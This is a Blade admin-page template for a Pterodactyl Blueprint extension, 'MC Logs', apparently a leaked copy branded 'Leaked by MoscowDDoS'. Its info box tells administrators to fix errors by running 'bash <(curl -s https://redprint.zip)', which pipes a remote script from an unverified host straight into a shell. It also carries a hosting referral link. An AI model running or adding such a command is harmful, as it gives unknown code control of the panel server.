@extends('layouts.admin')
<?php 
    // Define extension information.
    $EXTENSION_ID = "mclogs";
    $EXTENSION_NAME = stripslashes("MC Logs");
    $EXTENSION_VERSION = "v1.4";
    $EXTENSION_DESCRIPTION = stripslashes("Addon that allows users to Utilise the MCLOGS API");
    $EXTENSION_ICON = "/assets/extensions/mclogs/icon.jpg";
    $EXTENSION_WEBSITE = "https://euphoriadevelopment.uk";
    $EXTENSION_WEBICON = "bx bx-link-external";
?>
@include('blueprint.admin.template')

@section('title')
    {{ $EXTENSION_NAME }}
@endsection

@section('content-header')
    @yield('extension.header')
@endsection

@section('content')
    @yield('extension.config')
    @yield('extension.description')<!-- Version and Information Box (Full Width) -->
<div class="row">
    <div class="col-xs-12">
        <div class="box box-primary">
            <div class="box-header with-border">
                <h3 class="box-title"><strong>MC Logs</strong> Leaked by <strong>MoscowDDoS</strong></h3>
            </div>
            <div class="box-body">
                Identifier: <code>mclogs</code><br>
                Uninstall using: <code>blueprint -remove mclogs</code><br>
                If any errors occur use redprint! <code>bash <(curl -s https://redprint.zip)</code><br>
                Get support via <a href="https://kyonix.com/?ref_id=HW2nx1Ya31Kr" target="_blank" rel="noopener noreferrer">Hosting</a><br>
            </div>
        </div>
    </div>
</div>
@endsection
